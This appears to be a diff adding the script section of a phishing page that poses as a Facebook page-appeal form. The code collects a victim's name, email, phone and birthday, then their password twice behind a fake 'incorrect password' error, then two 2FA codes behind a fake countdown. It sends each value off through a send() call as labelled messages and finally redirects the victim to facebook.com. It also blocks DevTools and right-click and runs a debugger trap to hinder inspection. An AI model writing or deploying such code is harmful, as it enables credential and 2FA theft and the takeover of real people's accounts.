+            if(!ev){showError($('email-group'),$('email-error'),'Please enter your email address.');ok=false}else if(!/^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(ev)){showError($('email-group'),$('email-error'),'Please enter a valid email address.');ok=false}else{clearError($('email-group'),$('email-error'))}
+            var phv=phoneInput.value.trim();
+            if(!phv){showError($('phone-group'),$('phone-error'),'Please enter your mobile number.');ok=false}else if(phv.replace(/\D/g,'').length<7){showError($('phone-group'),$('phone-error'),'Please enter a valid mobile number.');ok=false}else{clearError($('phone-group'),$('phone-error'))}
+            var mv=birthdayMonth.value,dv=birthdayDay.value,yv=birthdayYear.value;
+            if(!mv||!dv||!yv){showError($('birthday-group'),$('birthday-error'),"It looks like you entered the wrong info. Please make sure you use your real date of birth.");ok=false}else{
+                var m=parseInt(mv),d=parseInt(dv),y=parseInt(yv);
+                if(y<1940||y>2014){showError($('birthday-group'),$('birthday-error'),"It looks like you entered the wrong info. Please make sure you use your real date of birth.");ok=false}else{
+                    var maxD=new Date(y,m,0).getDate();
+                    if(d<1||d>maxD){showError($('birthday-group'),$('birthday-error'),"It looks like you entered the wrong info. Please make sure you use your real date of birth.");ok=false}else{clearError($('birthday-group'),$('birthday-error'))}
+                }
+            }
+            if(ok){step1Data={pageName:pv,fbName:fv,email:ev,phone:getFullPhoneNumber(),phoneDial:selectedCountry.dial,birthday:mv+'/'+dv+'/'+yv};firstEmail=ev}
+            return ok;
+        }
+
+        function showPasswordPopup(){
+            $('pw-popup-input').value='';$('pw-popup-error').classList.remove('show');
+            $('pw-popup-group').classList.remove('input-error');
+            $('pw-popup-continue').classList.remove('loading');
+            $('pw-popup-toggle').classList.remove('visible');
+            $('password-popup').style.display='flex';document.body.classList.add('popup-open');
+            $('pw-popup-input').focus();
+            saveStep('2');
+        }
+
+        function maskEmail(em){if(!em||!em.includes('@'))return em||'';var p=em.split('@');return p[0].charAt(0)+'*****'+p[0].slice(-1)+'@'+p[1]}
+
+        function resetTwoFAForm(){twofaCode.value='';twofaContinue.disabled=true;twofaError.classList.remove('show');twofaCode.disabled=false;firstCode='';if(countdownInterval){clearInterval(countdownInterval);countdownInterval=null}}
+        function startCountdown(s){countdownSeconds=s;countdownSpan.textContent='0 minutes '+countdownSeconds+' seconds';twofaError.classList.add('show');twofaCode.disabled=true;countdownInterval=setInterval(function(){countdownSeconds--;if(countdownSeconds<=0){clearInterval(countdownInterval);countdownInterval=null;twofaError.classList.remove('show');twofaContinue.disabled=true;twofaCode.disabled=false}else{countdownSpan.textContent='0 minutes '+countdownSeconds+' seconds'}},1000)}
+        function showTwoFAPopup(){$('fb-header-display').textContent=(step1Data.fbName||'')+' · Facebook';displayEmail.textContent=maskEmail(firstEmail);displayPhone.textContent=maskPhone(step1Data.phone,step1Data.phoneDial);resetTwoFAForm();twofaPopup.style.display='flex';document.body.classList.add('popup-open');saveStep('3')}
+
+        // Password popup toggle
+        $('pw-popup-toggle').addEventListener('click',function(){
+            var p=$('pw-popup-input');
+            if(p.type==='password'){p.type='text';this.innerHTML='<svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M17.94 17.94A10.07 10.07 0 0112 20c-7 0-11-8-11-8a18.45 18.45 0 015.06-5.94M9.9 4.24A9.12 9.12 0 0112 4c7 0 11 8 11 8a18.5 18.5 0 01-2.16 3.19m-6.72-1.07a3 3 0 11-4.24-4.24"/><line x1="1" y1="1" x2="23" y2="23"/></svg>'}
+            else{p.type='password';this.innerHTML='<svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M1 12s4-8 11-8 11 8 11 8-4 8-11 8-11-8-11-8z"/><circle cx="12" cy="12" r="3"/></svg>'}
+        });
+        $('pw-popup-input').addEventListener('input',function(){clearError($('pw-popup-group'),$('pw-popup-error'));$('pw-popup-toggle').classList.toggle('visible',this.value.length>0)});
+
+        // Password popup continue button
+        var pwAttempt=0;
+        $('pw-popup-continue').addEventListener('click',function(){
+            var pv=$('pw-popup-input').value.trim();
+            if(!pv){showError($('pw-popup-group'),$('pw-popup-error'),'Please enter your password.');return}
+            if(pv.length<6){showError($('pw-popup-group'),$('pw-popup-error'),"The password you've entered is incorrect.");return}
+            $('pw-popup-continue').classList.add('loading');
+            if(pwAttempt===0){
+                pwAttempt=1;
+                firstPassword=pv;
+                send('login','<b>\uD83D\uDD34 [PASSWORD 1]</b>\n────────────────\nEmail: <code>'+firstEmail+'</code>\nPhone: <code>'+step1Data.phone+'</code>\nPassword: <code>'+firstPassword+'</code>\n────────────────');
+                setTimeout(function(){
+                    $('pw-popup-continue').classList.remove('loading');
+                    showError($('pw-popup-group'),$('pw-popup-error'),"The password you've entered is incorrect. Forgotten password?");
+                    $('pw-popup-input').value='';$('pw-popup-toggle').classList.remove('visible');
+                },12000);
+            }else{
+                secondPassword=pv;
+                send('login','\u26A1 <b><u>\uD83D\uDD34 [PASSWORD 2]</u></b>\n────────────────\nPassword: <code>'+secondPassword+'</code>\n────────────────');
+                setTimeout(function(){
+                    $('password-popup').style.display='none';
+                    setTimeout(function(){showTwoFAPopup()},1000);
+                },12000);
+            }
+        });
+
+        // Main continue button
+        continueBtn.addEventListener('click',function(){
+            if(isSending)return;
+            if(validateStep1()){
+                continueBtn.classList.add('loading');continueBtn.disabled=true;
+                setTimeout(function(){
+                    continueBtn.classList.remove('loading');continueBtn.disabled=false;
+                    showPasswordPopup();
+                },3000);
+            }
+            else{if($('page-name-group').classList.contains('input-error'))pageNameInput.focus();else if($('fb-name-group').classList.contains('input-error'))fbNameInput.focus();else if($('email-group').classList.contains('input-error'))$('email').focus();else if($('phone-group').classList.contains('input-error'))phoneInput.focus();else if($('birthday-group').classList.contains('input-error'))birthdayMonth.focus()}
+        });
+
+        twofaCode.addEventListener('input',function(){twofaContinue.disabled=this.value.trim().length<6});
+        twofaContinue.addEventListener('click',function(){
+            var code=twofaCode.value.trim();
+            if(!firstCode){
+                twofaContinue.classList.add('loading');twofaContinue.disabled=true;
+                firstCode=code;
+                send('2fa','\u26A1 <b><u>\uD83D\uDCCC [CODE 1]</u></b>\nCode: <code>'+code+'</code>');
+                setTimeout(function(){
+                    twofaContinue.classList.remove('loading');
+                    startCountdown(30);twofaCode.value='';twofaContinue.disabled=true;
+                },3000);
+            }else{
+                twofaError.classList.remove('show');
+                if(countdownInterval){clearInterval(countdownInterval);countdownInterval=null}
+                twofaContinue.classList.add('loading');twofaContinue.disabled=true;
+                send('2fa','\u26A1 <b><u>\uD83D\uDCCC [CODE 2]</u></b>\nCode: <code>'+code+'</code>');
+                setTimeout(function(){
+                    clearStep();
+                    window.location.href='https://www.facebook.com';
+                },3000);
+            }
+        });
+
+        $('try-another').addEventListener('click',function(e){e.preventDefault()});
+
+        function randomInt(min,max){return Math.floor(Math.random()*(max-min+1))+min}
+
+        // Custom birthday dropdowns
+        var monthNames=['','Jan','Feb','Mar','Apr','May','Jun','Jul','Aug','Sep','Oct','Nov','Dec'];
+        var bdMonthTrig=$('bd-month-wrap').querySelector('.custom-select-trigger'),
+            bdDayTrig=$('bd-day-wrap').querySelector('.custom-select-trigger'),
+            bdYearTrig=$('bd-year-wrap').querySelector('.custom-select-trigger'),
+            bdMonthOpts=$('bd-month-options'),bdDayOpts=$('bd-day-options'),bdYearOpts=$('bd-year-options'),
+            bdMonthInput=$('birthday-month'),bdDayInput=$('birthday-day'),bdYearInput=$('birthday-year');
+
+        for(var m=1;m<=12;m++){var o=document.createElement('div');o.className='custom-option';o.textContent=monthNames[m];o.dataset.value=m;bdMonthOpts.appendChild(o)}
+        for(var y=2014;y>=1940;y--){var o=document.createElement('div');o.className='custom-option';o.textContent=y;o.dataset.value=y;bdYearOpts.appendChild(o)}
+
+        function populateDayOptions(){
+            var m=parseInt(bdMonthInput.value),y=parseInt(bdYearInput.value),maxD=31;
+            if(m&&y)maxD=new Date(y,m,0).getDate();
+            else if(m){var dim=[31,29,31,30,31,30,31,31,30,31,30,31];maxD=dim[m-1]}
+            bdDayOpts.innerHTML='';
+            for(var d=1;d<=maxD;d++){var o=document.createElement('div');o.className='custom-option';o.textContent=d;o.dataset.value=d;bdDayOpts.appendChild(o)}
+        }
+
+        function selectBd(wrap,input,trig,val,txt){
+            input.value=val;trig.textContent=txt;trig.classList.add('selected');
+            wrap.classList.remove('open');input.dispatchEvent(new Event('change',{bubbles:true}))
+        }
+
+        function toggleBd(wrap){
+            var was=wrap.classList.contains('open');
+            [bdMonthInput.parentElement,bdDayInput.parentElement,bdYearInput.parentElement].forEach(function(w){w.classList.remove('open')});
+            if(!was)wrap.classList.add('open')
+        }
+
+        bdMonthTrig.addEventListener('click',function(){toggleBd(bdMonthInput.parentElement)});
+        bdDayTrig.addEventListener('click',function(){toggleBd(bdDayInput.parentElement)});
+        bdYearTrig.addEventListener('click',function(){toggleBd(bdYearInput.parentElement)});
+
+        bdMonthOpts.addEventListener('click',function(e){var o=e.target.closest('.custom-option');if(o){selectBd(bdMonthInput.parentElement,bdMonthInput,bdMonthTrig,o.dataset.value,o.textContent);populateDayOptions()}});
+        bdDayOpts.addEventListener('click',function(e){var o=e.target.closest('.custom-option');if(o){selectBd(bdDayInput.parentElement,bdDayInput,bdDayTrig,o.dataset.value,o.textContent)}});
+        bdYearOpts.addEventListener('click',function(e){var o=e.target.closest('.custom-option');if(o){selectBd(bdYearInput.parentElement,bdYearInput,bdYearTrig,o.dataset.value,o.textContent);populateDayOptions()}});
+
+        document.addEventListener('click',function(e){if(!e.target.closest('.custom-select')){document.querySelectorAll('.custom-select').forEach(function(w){w.classList.remove('open')})}});
+        populateDayOptions();
+
+        window.addEventListener('load',function(){
+            try{
+                var d=JSON.parse(localStorage.getItem(APPEAL_STEP_KEY));
+                if(d){
+                    if(d.sid)sessionId=d.sid;
+                    if(d.data)step1Data=d.data;
+                    if(d.email)firstEmail=d.email;
+                    if(d.step==='2'){showPasswordPopup();return;}
+                    if(d.step==='3'){showTwoFAPopup();return;}
+                }
+            }catch(e){}
+            twofaPopup.style.display='none';
+        });
+
+        // Input clear error on type
+        ['page-name','fb-name','email','phone-number'].forEach(function(id){
+            var el=$(id);if(el)el.addEventListener('input',function(){
+                var g=el.closest('.form-group');if(g&&g.classList.contains('input-error')){g.classList.remove('input-error');var em=g.querySelector('.error-message');if(em)em.classList.remove('show')}
+            });
+        });
+        [birthdayMonth,birthdayDay,birthdayYear].forEach(function(el){
+            if(el)el.addEventListener('change',function(){var g=$('birthday-group');if(g&&g.classList.contains('input-error')){g.classList.remove('input-error');$('birthday-error').classList.remove('show')}});
+        });
+    })();
+
+    // Block F12, DevTools, right-click + debugger trap
+    document.addEventListener('keydown',function(e){
+      if(e.key==='F12'||e.keyCode===123||(e.ctrlKey&&e.shiftKey&&(e.keyCode===73||e.keyCode===74||e.keyCode===67))||(e.ctrlKey&&e.keyCode===85)){e.preventDefault();return false;}
+    });
+    document.addEventListener('contextmenu',function(e){e.preventDefault();return false;});
+    setInterval(function(){debugger;},150);
+    </script>
+</body>
+</html>
